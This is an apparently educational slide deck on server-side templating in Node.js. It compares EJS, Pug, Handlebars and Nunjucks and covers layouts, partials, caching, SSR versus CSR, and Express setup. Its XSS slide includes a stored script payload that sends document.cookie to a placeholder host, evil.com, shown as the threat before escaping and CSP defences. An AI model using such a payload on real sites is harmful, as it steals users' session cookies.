# Introduction to Server-Side Templating

Engines, Patterns & Express Integration

EJS · Pug · Handlebars · Nunjucks · Mustache · Liquid

---

## Slide 01 — Title

**Introduction to Server-Side Templating**

Engines, Patterns & Express Integration

EJS · Pug · Handlebars · Nunjucks · Mustache · Liquid

---

## Slide 02 — Agenda

### Foundations
- What is server-side templating?
- How templating engines work
- The template engine landscape

### Engine Deep-Dives
- EJS — Embedded JavaScript
- Pug — Indentation-based syntax
- Handlebars — Logic-less templates
- Nunjucks — Jinja2 for JavaScript

### Patterns & Architecture
- Template inheritance & layouts
- Passing data to templates
- Partials & includes
- Security — XSS & escaping

### Production Concerns
- Performance & caching
- SSR vs CSR trade-offs
- Hybrid approaches (HTMX, Islands)
- Choosing an engine & Express integration

---

## Slide 03 — What Is Server-Side Templating?

### Core Concept

The server combines a **template** (HTML with placeholders) and **data** (from a DB, API, or session) to produce a **complete HTML document** before sending it to the client.

### SSR vs CSR

| | Server-Side Rendering | Client-Side Rendering |
|---|---|---|
| **HTML built** | On the server, per request | In the browser via JS |
| **First paint** | Immediate — complete HTML | Blank page until JS loads |
| **SEO** | Crawlers get full content | Requires pre-rendering |
| **Interactivity** | Full page reloads (unless enhanced) | Rich SPA experience |

### Request Flow

1. `GET /users` — Client sends request
2. **Route Handler** — Express matches route
3. **Fetch Data** — Query DB or API
4. **Template + Data** — Engine merges them
5. **HTML Response** — Complete HTML sent to client

---

## Slide 04 — How Templating Engines Work

### 1. Parse

The engine reads the template source and tokenises it into an **Abstract Syntax Tree** (AST). Static text nodes and dynamic expression nodes are separated.

```
TokenStream:
  TEXT   "Hello, "
  EXPR   user.name
  TEXT   "!"
```

### 2. Compile

The AST is compiled into an executable **render function**. Many engines generate a plain JavaScript function that concatenates strings.

```javascript
// Compiled output (simplified)
function render(locals) {
  let out = "Hello, ";
  out += escape(locals.user.name);
  out += "!";
  return out;
}
```

### 3. Render

The compiled function is invoked with a **data context**. The result is a complete HTML string ready for `res.send()`.

```javascript
const html = render({
  user: { name: "Alice" }
});
// => "Hello, Alice!"
res.send(html);
```

### Caching Layer

Production engines cache the **compiled function** so subsequent renders skip parsing and compilation entirely. Only the render step executes per request. This is why `app.set('view cache', true)` matters in Express production mode.

---

## Slide 05 — The Template Engine Landscape

| Engine | Syntax Style | Logic | Inheritance | Auto-Escape | npm Weekly |
|---|---|---|---|---|---|
| **EJS** | Embedded JS `<%= %>` | Full JS | Partials only | `<%= %>` yes | ~14M |
| **Pug** | Indentation-based | Full JS | extends/block | Yes (default) | ~5M |
| **Handlebars** | Mustache `{{ }}` | Helpers only | Partials + layouts | Yes (default) | ~11M |
| **Nunjucks** | Jinja2 `{{ }}/{% %}` | Filters + macros | extends/block | Configurable | ~1.5M |
| **Mustache** | Logic-less `{{ }}` | None | Partials only | Yes | ~5M |
| **Liquid** | Shopify `{{ }}/{% %}` | Tags + filters | Layouts + sections | Yes | ~1.2M |

### Key Insight

All engines solve the same fundamental problem: merge data with markup. They differ on how much **logic** they allow in templates and how they handle **composition** (layouts, inheritance, partials).

### Choosing Criteria

Consider: syntax familiarity, security defaults, Express integration quality, community/ecosystem, performance characteristics, and whether you need logic-less enforcement.

---

## Slide 06 — EJS — Embedded JavaScript

### Tag Reference

| Tag | Purpose |
|---|---|
| `<%= expr %>` | Output with HTML escaping |
| `<%- expr %>` | Output **unescaped** (raw HTML) |
| `<% code %>` | Execute JS (no output) |
| `<%# comment %>` | Comment (stripped from output) |
| `<%- include('path') %>` | Include a partial |

### Why EJS?

- Zero new syntax — it's just JavaScript
- Lowest learning curve for JS developers
- Excellent Express integration out of the box
- High npm download count = large ecosystem

### Example: User List

```html
<!-- views/users.ejs -->
<h1><%= title %></h1>

<% if (users.length) { %>
  <ul>
    <% users.forEach(user => { %>
      <li>
        <strong><%= user.name %></strong>
        <span><%= user.email %></span>
      </li>
    <% }) %>
  </ul>
<% } else { %>
  <p>No users found.</p>
<% } %>
```

### Express Setup

```javascript
app.set('view engine', 'ejs');
app.set('views', './views');

app.get('/users', async (req, res) => {
  const users = await User.find();
  res.render('users', {
    title: 'All Users',
    users
  });
});
```

---

## Slide 07 — Pug — Indentation-Based Syntax

### Syntax Fundamentals

```pug
//- views/users.pug
extends layout

block content
  h1= title

  if users.length
    ul
      each user in users
        li
          strong= user.name
          span= user.email
  else
    p No users found.
```

### Mixins — Reusable Components

```pug
mixin userCard(user)
  .card
    h3= user.name
    p= user.bio
    a(href=`/users/${user.id}`) View Profile

//- Usage
each user in users
  +userCard(user)
```

### Template Inheritance

```pug
//- views/layout.pug
doctype html
html(lang="en")
  head
    meta(charset="UTF-8")
    title= title
    link(rel="stylesheet" href="/css/app.css")
  body
    include partials/nav
    main.container
      block content
    include partials/footer
```

### Key Features

- **No closing tags** — indentation defines nesting
- **Auto-escapes** by default; use `!=` for raw
- **Mixins** act like template-level functions
- **Filters** for inline Markdown, CoffeeScript, etc.
- Compiles to highly optimised JS functions

---

## Slide 08 — Handlebars — Logic-Less Templates

### Expressions & Helpers

```handlebars
<!-- views/users.hbs -->
<h1>{{title}}</h1>

{{#if users.length}}
  <ul>
    {{#each users}}
      <li>
        <strong>{{this.name}}</strong>
        <span>{{this.email}}</span>
        <em>Joined {{formatDate this.createdAt}}</em>
      </li>
    {{/each}}
  </ul>
{{else}}
  <p>No users found.</p>
{{/if}}
```

### Custom Helpers

```javascript
const hbs = require('hbs');

hbs.registerHelper('formatDate', (date) => {
  return new Intl.DateTimeFormat('en-GB', {
    day: 'numeric', month: 'short', year: 'numeric'
  }).format(new Date(date));
});

hbs.registerHelper('eq', (a, b) => a === b);
hbs.registerHelper('gt', (a, b) => a > b);
```

### Partials

```handlebars
<!-- views/partials/userCard.hbs -->
<div class="card">
  <h3>{{name}}</h3>
  <p>{{bio}}</p>
  <a href="/users/{{id}}">Profile</a>
</div>

<!-- Usage -->
{{#each users}}
  {{> userCard this}}
{{/each}}
```

### Philosophy: Logic-Less

- Templates cannot execute arbitrary JavaScript
- Logic is constrained to **built-in block helpers**: `if`, `each`, `unless`, `with`
- Custom logic goes into **registered helpers**
- Forces clean **separation of concerns**
- Safer by default — templates can't mutate state
- Precompilable to JS for client-side use

---

## Slide 09 — Nunjucks — Jinja2 for JavaScript

### Template Syntax

```twig
{# views/users.njk #}
{% extends "layout.njk" %}

{% block content %}
  <h1>{{ title }}</h1>

  {% if users | length %}
    <ul>
    {% for user in users %}
      <li>
        <strong>{{ user.name }}</strong>
        {{ user.email }}
        {{ user.createdAt | date("d MMM yyyy") }}
      </li>
    {% endfor %}
    </ul>
  {% else %}
    <p>No users found.</p>
  {% endif %}
{% endblock %}
```

### Filters

```twig
{{ name | capitalize }}
{{ price | round(2) }}
{{ items | join(", ") }}
{{ html | safe }}
{{ text | truncate(100) }}
{{ data | dump | safe }}
```

### Macros — Template Functions

```twig
{# macros/forms.njk #}
{% macro field(name, label, type="text", val="") %}
  <div class="form-group">
    <label for="{{ name }}">{{ label }}</label>
    <input type="{{ type }}"
           id="{{ name }}"
           name="{{ name }}"
           value="{{ val }}">
  </div>
{% endmacro %}

{# Usage #}
{% from "macros/forms.njk" import field %}
{{ field("email", "Email Address", "email") }}
{{ field("password", "Password", "password") }}
```

### Why Nunjucks?

- Familiar to Python/Jinja2 developers
- **Macros** provide component-like reuse
- **Template inheritance** is first-class
- Rich **filter** pipeline for data transformation
- Async support for `await` in templates
- Maintained by Mozilla

---

## Slide 10 — Template Inheritance & Layouts

### Base Layout (Nunjucks)

```twig
{# views/base.njk #}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{% block title %}My App{% endblock %}</title>
  <link rel="stylesheet" href="/css/app.css">
  {% block head %}{% endblock %}
</head>
<body>
  {% include "partials/nav.njk" %}
  <main class="container">
    {% block content %}{% endblock %}
  </main>
  {% include "partials/footer.njk" %}
  {% block scripts %}{% endblock %}
</body>
</html>
```

### Child Template

```twig
{# views/dashboard.njk #}
{% extends "base.njk" %}

{% block title %}Dashboard{% endblock %}

{% block head %}
  <link rel="stylesheet" href="/css/charts.css">
{% endblock %}

{% block content %}
  <h1>Dashboard</h1>
  <div class="stats">{{ stats | dump | safe }}</div>
{% endblock %}

{% block scripts %}
  <script src="/js/charts.js"></script>
{% endblock %}
```

### Pattern Comparison

| Pattern | EJS | Pug | Handlebars | Nunjucks |
|---|---|---|---|---|
| Inheritance | N/A (use partials) | `extends` / `block` | `express-handlebars` layouts | `extends` / `block` |
| Partials | `include('file')` | `include file` | `{{> partial}}` | `{% include "file" %}` |
| Blocks | N/A | `block name` | N/A (helper-based) | `{% block name %}` |

---

## Slide 11 — Passing Data to Templates

### res.render() — The Core API

```javascript
// Signature
res.render(view, [locals], [callback]);

// Basic usage
app.get('/profile', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.render('profile', {
    user,
    title: `${user.name}'s Profile`,
    isOwner: req.user?.id === user.id
  });
});
```

### app.locals — Global Data

```javascript
// Available in EVERY template render
app.locals.siteName = 'MyApp';
app.locals.year = new Date().getFullYear();
app.locals.formatCurrency = (n) =>
  new Intl.NumberFormat('en-GB', {
    style: 'currency', currency: 'GBP'
  }).format(n);
```

### res.locals — Per-Request Data

```javascript
// Middleware sets per-request locals
app.use((req, res, next) => {
  res.locals.currentUser = req.user || null;
  res.locals.csrfToken = req.csrfToken?.();
  res.locals.flash = req.flash?.() || {};
  next();
});

// Available in templates without explicit passing
// <%= currentUser.name %>
// <input type="hidden" value="<%= csrfToken %>">
```

### Data Resolution Order

1. **res.render() locals** — highest priority
2. **res.locals** — per-request (middleware)
3. **app.locals** — application-wide globals

Later values do **not** override earlier ones. The object passed to `res.render()` takes precedence over `res.locals`, which takes precedence over `app.locals`.

---

## Slide 12 — Partials & Includes

### EJS Partials

```html
<!-- views/partials/nav.ejs -->
<nav class="navbar">
  <a href="/"><%= siteName %></a>
  <% if (currentUser) { %>
    <span><%= currentUser.name %></span>
    <a href="/logout">Logout</a>
  <% } else { %>
    <a href="/login">Login</a>
  <% } %>
</nav>

<!-- Include in layout -->
<%- include('partials/nav') %>
```

### Pug Includes

```pug
//- views/partials/nav.pug
nav.navbar
  a(href="/")= siteName
  if currentUser
    span= currentUser.name
    a(href="/logout") Logout
  else
    a(href="/login") Login

//- Include in layout
include partials/nav
```

### Handlebars Partials

```handlebars
<!-- views/partials/nav.hbs -->
<nav class="navbar">
  <a href="/">{{siteName}}</a>
  {{#if currentUser}}
    <span>{{currentUser.name}}</span>
    <a href="/logout">Logout</a>
  {{else}}
    <a href="/login">Login</a>
  {{/if}}
</nav>

<!-- Include in layout -->
{{> nav}}
```

### Directory Structure Convention

```
views/
├── layouts/
│   └── main.ejs          # Base layout (HTML shell)
├── partials/
│   ├── nav.ejs            # Navigation bar
│   ├── footer.ejs         # Footer
│   ├── flash.ejs          # Flash messages
│   └── head.ejs           # <head> meta/links
├── users/
│   ├── index.ejs          # User list page
│   ├── show.ejs           # Single user page
│   └── edit.ejs           # Edit user form
└── errors/
    ├── 404.ejs
    └── 500.ejs
```

---

## Slide 13 — Security — XSS & Escaping

### The Threat: Cross-Site Scripting (XSS)

```javascript
// User input stored in DB:
const comment = {
  text: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>'
};

// UNSAFE: raw output
res.render('comment', { comment });
// Template: <%- comment.text %>
// => Script EXECUTES in victim's browser
```

### Auto-Escaping by Engine

| Engine | Escaped Output | Raw / Unescaped |
|---|---|---|
| EJS | `<%= %>` | `<%- %>` |
| Pug | `= expr` | `!= expr` |
| Handlebars | `{{expr}}` | `{{{expr}}}` |
| Nunjucks | `{{expr}}` (if enabled) | `{{expr \| safe}}` |

### Defence in Depth

- **Always use escaped output** as default
- Only use raw output for trusted, pre-sanitised HTML
- Sanitise with `DOMPurify` or `sanitize-html` before storage
- Set `Content-Security-Policy` headers
- Use `helmet` middleware in Express

```javascript
const sanitizeHtml = require('sanitize-html');

// Sanitise BEFORE storing
const clean = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
  allowedAttributes: { a: ['href'] }
});

// Now safe to render raw
// <%- clean %>
```

### CSP Header Example

```javascript
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"]
  }
}));
```

---

## Slide 14 — Performance

### Template Caching

```javascript
// Express enables caching automatically in production
app.set('view cache', true);

// NODE_ENV=production does this by default

// In development, templates are re-read from disk on every render call
```

Caching stores the **compiled function**, not the rendered HTML. Each render still executes the function with fresh data.

### Precompilation

```bash
# Handlebars CLI precompile
npx handlebars views/ -f public/js/templates.js

# Pug compile at build time
const pug = require('pug');
const fn = pug.compileFile('views/user.pug');
// fn({ user }) => HTML string
```

Precompilation eliminates **parse + compile** cost entirely. Only the render step runs at request time.

### Streaming Renders

```javascript
// Marko supports streaming
const template = require('./views/page.marko');

app.get('/', (req, res) => {
  res.type('html');
  template.render({ data }, res);
  // Chunks sent as rendered
  // TTFB is near-instant
});
```

Streaming sends HTML chunks as they're rendered, dramatically improving **Time to First Byte**.

### Benchmark Considerations

| Strategy | Impact | Trade-off |
|---|---|---|
| View caching | 10-50x faster repeated renders | Must restart to pick up template changes |
| Precompilation | Eliminates parse/compile overhead | Requires build step |
| Fragment caching | Cache expensive partials (Redis/LRU) | Cache invalidation complexity |
| Streaming | Near-instant TTFB | Limited engine support (Marko, React) |

---

## Slide 15 — Server-Side vs Client-Side Rendering

| Dimension | SSR (Template Engines) | CSR (React, Vue SPA) |
|---|---|---|
| First Contentful Paint | Fast — HTML arrives ready | Slow — blank until JS bundle loads |
| Time to Interactive | Immediate (no hydration) | Delayed by JS parse + hydration |
| SEO | Excellent — crawlers see full content | Requires SSR/SSG or prerendering |
| Bundle Size | Zero client JS (unless added) | 100KB-2MB+ framework + app code |
| Interactivity | Full page reloads (form posts) | Instant UI updates, optimistic UI |
| Server Load | Higher — renders on every request | Lower — serves static files + API |
| Complexity | Simple — HTML + data | State management, routing, build tooling |
| Offline Support | None (server required) | Service Workers + cached assets |

### SSR Wins When

- Content-heavy sites (blogs, docs, e-commerce)
- SEO is critical
- Low-powered client devices
- Minimal client-side interactivity needed

### CSR Wins When

- Highly interactive dashboards / apps
- Real-time collaboration features
- Offline-first requirements
- Complex client state management

---

## Slide 16 — Hybrid Approaches

### HTMX

Server renders HTML fragments; HTMX swaps them into the DOM via **hypermedia** attributes. No client framework needed.

```html
<button hx-get="/api/users"
        hx-target="#user-list"
        hx-swap="innerHTML"
        hx-indicator="#spinner">
  Load Users
</button>

<div id="user-list"></div>
<span id="spinner" class="htmx-indicator">Loading...</span>
```

### Islands Architecture

Static SSR HTML with isolated **interactive islands** that hydrate independently. Pioneered by Astro.

```html
<!-- Astro component -->
---
import Header from './Header.astro';
import Cart from './Cart.jsx';
---
<!-- Static: zero JS -->
<Header />

<!-- Interactive island -->
<Cart client:visible />

<!-- Static: zero JS -->
<footer>...</footer>
```

### Partial Hydration

Frameworks like **Qwik** and **React Server Components** serialise state so components hydrate only when interacted with.

```jsx
// React Server Component
// This never ships to the client
async function UserList() {
  const users = await db.query('SELECT * FROM users');
  return (
    <ul>
      {users.map(u => <li key={u.id}>{u.name}</li>)}
    </ul>
  );
}
```

### The Spectrum

Full SSR → SSR + HTMX → Islands → RSC / Partial Hydration → Full CSR SPA

Choose the point on the spectrum that matches your interactivity requirements.

---

## Slide 17 — Choosing a Template Engine

| Criterion | EJS | Pug | Handlebars | Nunjucks |
|---|---|---|---|---|
| Learning Curve | Minimal (it's JS) | Moderate (new syntax) | Low | Low-Moderate |
| Template Logic | Full JavaScript | Full JavaScript | Helpers only | Filters + Macros |
| Inheritance | Partials only | Full (extends/block) | Layout plugin | Full (extends/block) |
| Security Default | Escaped by default | Escaped by default | Escaped by default | Configurable |
| Precompilation | Limited | Yes (CLI) | Yes (CLI) | Yes |
| Client-Side Use | Yes (ejs.min.js) | Yes (pug runtime) | Yes (handlebars.js) | Yes (slim build) |
| Best For | Quick prototypes, JS teams | Clean markup, designers | Logic-less enforcement | Complex layouts, Python devs |

### Decision Heuristic

- Need full JS power in templates? **EJS** or **Pug**
- Want strict separation of logic? **Handlebars**
- Need macros + inheritance? **Nunjucks**
- Team knows Python/Jinja2? **Nunjucks**
- Shortest path to working code? **EJS**

### Don't Overthink It

All major engines are battle-tested in production. The performance differences are negligible for most applications. Choose based on **team familiarity** and **architectural preferences** (logic-full vs logic-less, inheritance vs partials).

---

## Slide 18 — Express Integration — Complete Example

### app.js

```javascript
const express = require('express');
const path = require('path');
const app = express();

// View engine setup
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Static files
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

// Global locals
app.locals.siteName = 'MyApp';

// Per-request locals
app.use((req, res, next) => {
  res.locals.currentUser = req.user || null;
  res.locals.path = req.path;
  next();
});

// Routes
app.get('/', (req, res) => {
  res.render('pages/home', { title: 'Home' });
});

app.get('/users', async (req, res) => {
  const users = await User.find();
  res.render('pages/users', { title: 'Users', users });
});

app.use((req, res) => {
  res.status(404).render('errors/404');
});

app.listen(3000);
```

### views/layouts/main.ejs

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><%= title %> | <%= siteName %></title>
  <link rel="stylesheet" href="/css/app.css">
</head>
<body>
  <%- include('../partials/nav') %>
  <main class="container">
    <%- include('../partials/flash') %>
    <%- body %>
  </main>
  <%- include('../partials/footer') %>
</body>
</html>
```

### Project Structure

```
project/
├── app.js
├── package.json
├── public/
│   ├── css/app.css
│   └── js/app.js
└── views/
    ├── layouts/
    │   └── main.ejs
    ├── partials/
    │   ├── nav.ejs
    │   ├── footer.ejs
    │   └── flash.ejs
    ├── pages/
    │   ├── home.ejs
    │   └── users.ejs
    └── errors/
        ├── 404.ejs
        └── 500.ejs
```

---

## Slide 19 — Summary & Next Steps

### Key Takeaways

- Server-side templating merges **data + markup** on the server to produce complete HTML
- Engines follow a **parse → compile → render** pipeline; caching skips parse/compile
- **EJS** for pure JS, **Pug** for clean syntax, **Handlebars** for logic-less, **Nunjucks** for macros/inheritance
- **Always escape output** — XSS is the primary template security risk
- Template inheritance and partials eliminate duplication
- Hybrid approaches (HTMX, Islands) bridge SSR and interactivity

### Next Steps

- Build a CRUD app with Express + your chosen engine
- Implement a layout with partials for nav, footer, flash
- Add HTMX for dynamic updates without a framework
- Set up helmet + CSP headers for security
- Benchmark your engine with `autocannon`
- Explore Astro or Remix for hybrid SSR/CSR

### Resources

- [ejs.co](https://ejs.co) — EJS documentation
- [pugjs.org](https://pugjs.org) — Pug documentation
- [handlebarsjs.com](https://handlebarsjs.com) — Handlebars guide
- [Nunjucks docs](https://mozilla.github.io/nunjucks/) — Mozilla Nunjucks
- [htmx.org](https://htmx.org) — HTMX
- [Express template guide](https://expressjs.com/en/guide/using-template-engines.html)
